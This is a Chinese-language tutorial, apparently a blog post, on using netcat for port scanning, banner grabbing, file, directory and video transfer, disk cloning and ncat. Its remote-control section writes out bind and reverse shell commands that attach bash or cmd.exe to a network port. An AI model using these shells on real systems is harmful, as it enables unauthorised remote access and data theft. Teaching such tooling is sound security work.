# netcat使用

## 1.netcat 简介

 **netcat是一个通过TCP/UDP在网络中进行读写数据工具（命令），被称为“瑞士军刀”**，主要用于调试领域、传输领域甚至黑客攻击领域。利用该工具，可以将网络中一端的数据完整的发送至另一台主机终端显示或存储，常见的应用为文件传输、与好友即时通信、传输流媒体或者作为用来验证服务器的独立的客户端。当然，也可以在脚本中使用该工具

现在的Linux都默认安装nc，只是版本可能不一致，导致某些参数不能通用，我以下介绍的是kail中的nc

## 2.功能介绍

-   侦听模式/传输模式
-   Telnet/获取banner信息
-   传输文本信息
-   传输文件/目录
-   加密传输文件
-   远程控制/木马
-   加密所有流量
-   流媒体服务器
-   远程克隆硬盘

## 3.命令介绍

```
nc -h					#可以看到nc版本和参数介绍
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/7221bca7a1124671ace7fc475a13235c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbmd5b25na2FuZzY2Ng==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

**nc中比较常用的参数说明**

```
-4 : 强制nc使用ipv4
-6 : 强制nc使用ipv6
-D : 使用socket的方式
-d : daemon（后台）运行，就可以配置成服务
-l : 监听模式，如果没有特别指定后面常常隐式使用-p参数
-n : 使用ip的，而不使用域名
-p : 使用本地主机的端口，默认是tcp协议的端口
-r : 任意指定本地及远程端口
-s : 设置本地主机送出数据包的IP地址，主机上有多个IP时指定绑定的IP
-U : 使用Unix的socket
-u : 使用udp协议
-v : 详细输出
-z : 将输入输出关掉，即不进行交互，用于扫描时，注意在nmap的版本下没有这个参数
-w : 设置连接超时时间，单位秒
1234567891011121314
```

## 4.功能展示

### **1.端口扫描**

**命令：**

```
netcat -v ip port
netcat -nvz 1.1.1.1 1-65535
12
```

### **2.获取banner信息**

端口banner信息
1.它是端口的欢迎语。
2.banner信息包括：软件开发商、软件名称、服务类型、版本号等信息。
3.可通过banner信息，进行漏洞测试。如：对应的CVE漏洞等。

```
nc -nv 220.181.12.110 110
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/921e01bcc6cc43ac976679c978233b23.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbmd5b25na2FuZzY2Ng==,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center)

### **3.传输文本信息、远程电子取证信息收集**

原则：不对目标对象进行修改，避免破坏证据

**使用场景**

**取证**
当目标机器被黑客攻击之后，取证人员可以利用nc的文件传输功能来获取目标机器上的文件内容。避免直接在目标机器上进行操作造成取证的误差。
单纯获取目标机器敏感文件

当目标机器上有一些文件内容，无法正常下载时，可以利用nc进行文件传输。
**为什么可以直接利用nc进行文件传输呢？**
nc中的数据传输 使用的是标准的输入、输出流，所以可以直接利用命令行来进行操作。

```
nc -l -p 4444(服务端)			   //-l   监听模式，用于入站连接   -p   指定端口
								// 在自己的电脑上开一个端口	4444	
nc -nv 1.1.1.1 4444(客户端) 

netstat -pantu | grep 4444
12345
```

正向文件传输

```
nc -lp 444 > 1.txt（服务端）
nc -lp 444 > 1.mp4

nc -nv 1.1.1.1 444 < 1.txt -q 1（客户端）
nc -nv 1.1.1.1 444 < 1.mp4 -q 1
12345
```

反向文件传输

```
nc -lp 444 < 1.txt -q 1（服务端）

nc -nv 1.1.1.1 444 > 1.txt（客户端）
123
-q 1      //传输完成后延迟1秒退出
1
```

### **4.传输目录**

```
tar -cvf - file/ | nc -lp 444 -q 1    		//发送端
nc -nv 1.1.1.1 444 | tar -xvf -				//接收端

tar -c   创建一个新归档			 //-cvf
    -x   从归档中解出文件			//-xvf
12345
```

### **5.加密传输文件**

加密传输文件需要使用 mcrypt 库，linux 系统默认是没有安装的，需要手动安装。随后和传输文件类似，只需要在传输文件时使用 mcrypt 加密即可。

```
nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4

mcrypt --flush -Fbq -a rijndael-256 -m ecb < 1.mp4 | nc -nv 192.168.178.138 333 -q 1
123
```

### **6.流媒体服务**

对于直播的功能就类似于[流媒体](https://so.csdn.net/so/search?q=流媒体&spm=1001.2101.3001.7020)，就是对方把视频通过流的方式进行传输，传输多少，对方就会实时的播放多少。

首先，需要在要传送文件的机器上把文件通过管道给 nc，然后监听一个端口。在接收端，连接此端口然后通过管道给 mplayer 进行实时播放，mplayer 默认 linux 不安装，需要手动安装。其中 vo 参数是选择驱动程序，cache 是每秒要接收的播放帧

```
cat 1.mp4 | nc -lp 333

nc -nv 192.168.178.138 333 | mplayer -vo x11 -cache 3000 -
123
```

### **7.远程控制**

正向

```
nc -lp 444 -c bash

nc -nv IP 444
123
```

反向

```
nc -lp 444

nc IP 444 -c bash
注：windows 把bash改为cmd
1234
```

nc正向反弹shell(将shell弹到本地端口，随后使用nc链接本地端口)

```
nc -lvvp 7777 -e /bin/bash
1
```

nc反向反弹shell

```
nc ip 8888 -e /bin/bash  
nc ip 8888 -e c:\windows\system32\cmd.exe
12
```

### **8.远程硬盘克隆**

```
nc -lp 444 | dd of=/dev/sda						//接收端

dd if=/dev/sda | nc -nv 1.1.1.1 444 -q 1		//发送端
123
```

### **9.NCAT**

NC缺乏加密和身份验证的能力，NCAT弥补了NC的不足

Ncat包含于nmap工具包中

```
ncat -c bash --allow IP -vnl 333 --ssl

ncat -nv IP 333 --ssl
123
```